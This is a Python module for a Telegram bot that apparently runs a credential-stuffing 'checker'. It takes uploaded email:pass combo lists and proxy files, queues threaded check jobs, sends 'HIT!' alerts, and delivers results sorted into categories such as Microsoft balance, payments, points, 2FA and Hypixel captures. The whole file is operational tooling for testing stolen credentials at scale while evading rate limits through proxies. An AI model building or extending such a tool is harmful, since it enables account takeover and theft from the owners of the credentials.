"""Combo + proxy file upload + the actual job runner."""

from __future__ import annotations

import asyncio
import logging
import time
from pathlib import Path

from pyrogram import filters, types

from ..config import SETTINGS
from ..core.engine import CheckEngine
from ..core.progress import Progress
from ..core.queue import Job
from ..core.results import ResultStore
from ._common import reply_unauthorized

log = logging.getLogger(__name__)


def _looks_like_proxy_file(filename: str, caption: str | None) -> bool:
    name = (filename or "").lower()
    cap = (caption or "").lower()
    return "proxy" in name or "proxies" in name or "proxy" in cap


async def _read_combo_file(client, message: types.Message) -> list[str]:
    download_path = await client.download_media(message, in_memory=True)
    raw = download_path.getvalue() if hasattr(download_path, "getvalue") \
        else Path(str(download_path)).read_bytes()
    text = raw.decode("utf-8", errors="ignore")
    return [line.strip() for line in text.splitlines() if line.strip()]


def register(app) -> None:
    client = app.client
    db = app.db
    queue = app.queue

    @client.on_message(filters.private & filters.document)
    async def on_document(_, message: types.Message):
        user_id = message.from_user.id
        u = db.get_user(user_id)
        if not u or u["role"] not in ("authorized", "admin"):
            await reply_unauthorized(message, u["role"] if u else "none")
            return

        doc = message.document
        size_mb = (doc.file_size or 0) / (1024 * 1024)
        if size_mb > SETTINGS.max_combo_size_mb:
            await message.reply(
                f"⚠️ File too large ({size_mb:.1f} MB). "
                f"Max is {SETTINGS.max_combo_size_mb} MB."
            )
            return

        is_proxy = _looks_like_proxy_file(doc.file_name, message.caption)

        try:
            lines = await _read_combo_file(client, message)
        except Exception as exc:
            log.exception("download failed")
            await message.reply(f"⚠️ Couldn't read file: {exc}")
            return

        if is_proxy:
            if user_id not in app.pending_combos:
                await message.reply("⚠️ Send a combo file first.")
                return
            combos = app.pending_combos.pop(user_id)
            await _enqueue(message, user_id, combos, lines)
        else:
            if not (doc.file_name or "").lower().endswith(".txt"):
                await message.reply("⚠️ Please upload a .txt file.")
                return
            combos = [c for c in lines if ":" in c]
            if not combos:
                await message.reply("⚠️ No valid <code>email:pass</code> lines found.")
                return
            app.pending_combos[user_id] = combos
            await message.reply(
                f"📥 Got <b>{len(combos)}</b> combos.\n\n"
                "🔌 Now send a proxy <code>.txt</code> file (file name should "
                "contain <i>proxy</i>), or send /noproxy to run without proxies."
            )

    @client.on_message(filters.command("noproxy") & filters.private)
    async def cmd_noproxy(_, message: types.Message):
        user_id = message.from_user.id
        if user_id not in app.pending_combos:
            await message.reply("⚠️ Send a combo file first.")
            return
        combos = app.pending_combos.pop(user_id)
        await _enqueue(message, user_id, combos, [])

    @client.on_message(filters.command("cancel") & filters.private)
    async def cmd_cancel(_, message: types.Message):
        user_id = message.from_user.id
        had = app.pending_combos.pop(user_id, None) is not None
        app.awaiting_threads.discard(user_id)
        await message.reply(
            "❌ Pending upload cleared." if had else "Nothing to cancel."
        )

    async def _enqueue(message: types.Message, user_id: int,
                       combos: list[str], proxies: list[str]) -> None:
        status = await message.reply(
            f"⌛ <b>Queued.</b>\n"
            f"Combos: {len(combos)} · Proxies: {len(proxies)}\n"
            f"Position: <b>{queue.waiting + queue.running + 1}</b>"
        )

        async def run() -> None:
            await _run_job(message, status, user_id, combos, proxies)

        await queue.submit(Job(user_id=user_id, coro=run, label=f"u{user_id}"))

    async def _run_job(
        message: types.Message,
        status_msg: types.Message,
        user_id: int,
        combos: list[str],
        proxies: list[str],
    ) -> None:
        loop = asyncio.get_running_loop()

        user_settings = db.get_settings(user_id)
        max_threads = (SETTINGS.threads_max_admin if user_id == SETTINGS.admin_id
                       else SETTINGS.threads_max_user)
        threads = min(user_settings["threads"], max_threads)
        notify_hits = bool(user_settings["hit_notifications"])
        result_type = user_settings["result_type"]
        file_format = user_settings["file_format"]

        results = ResultStore.for_job(user_id, int(time.time()))
        progress = Progress(total=len(combos))

        def on_hit(capture):
            if notify_hits:
                # Schedule a Telegram message from the worker thread
                line = capture.builder()
                async def _send():
                    try:
                        await client.send_message(
                            user_id,
                            f"🎯 <b>HIT!</b>\n<code>{line}</code>",
                        )
                    except Exception:
                        pass
                asyncio.run_coroutine_threadsafe(_send(), loop)

        engine = CheckEngine(
            combos=combos, proxies=proxies, threads=threads,
            progress=progress, results=results, on_hit=on_hit,
        )

        async def progress_loop() -> None:
            interval = SETTINGS.progress_edit_interval
            while True:
                await asyncio.sleep(interval)
                snap = progress.snapshot()
                try:
                    await status_msg.edit_text(progress.render())
                except Exception:
                    pass
                if snap.checked >= snap.total:
                    return

        prog_task = asyncio.create_task(progress_loop())
        try:
            await loop.run_in_executor(None, engine.start)
        finally:
            prog_task.cancel()
            try:
                await prog_task
            except asyncio.CancelledError:
                pass

        snap = progress.snapshot()
        db.add_stats(user_id, hits=snap.hits, bad=snap.bad,
                     twofa=snap.twofa, errors=snap.errors)

        # Final progress edit + result delivery
        try:
            await status_msg.edit_text(progress.render_final())
        except Exception:
            pass

        await _send_results(client, user_id, results, file_format, result_type, snap)

    async def _send_results(
        client, user_id: int, results: ResultStore,
        file_format: str, result_type: str, snap,
    ) -> None:
        if file_format == "zip":
            try:
                zip_path = results.make_zip()
                await client.send_document(
                    user_id, str(zip_path),
                    caption=f"📦 Results · {snap.hits} hits / {snap.bad} bad "
                            f"/ {snap.twofa} 2fa / {snap.errors} err",
                )
                return
            except Exception:
                log.exception("zip send failed, falling back to txt files")

        # Plain txt files
        hits_path = results.hits_file()
        if hits_path.exists() and hits_path.stat().st_size > 0:
            try:
                await client.send_document(user_id, str(hits_path),
                                           caption="✅ Hits")
            except Exception:
                pass
        if result_type == "all":
            for category in ("Capture", "MS_Balance", "MS_Points",
                             "MS_Payments", "Hypixel_Capture", "Donut_Capture",
                             "2fa", "Bad", "Errors"):
                p = results.path_for(category)
                if p.exists() and p.stat().st_size > 0:
                    try:
                        await client.send_document(
                            user_id, str(p), caption=f"{category}",
                        )
                    except Exception:
                        pass
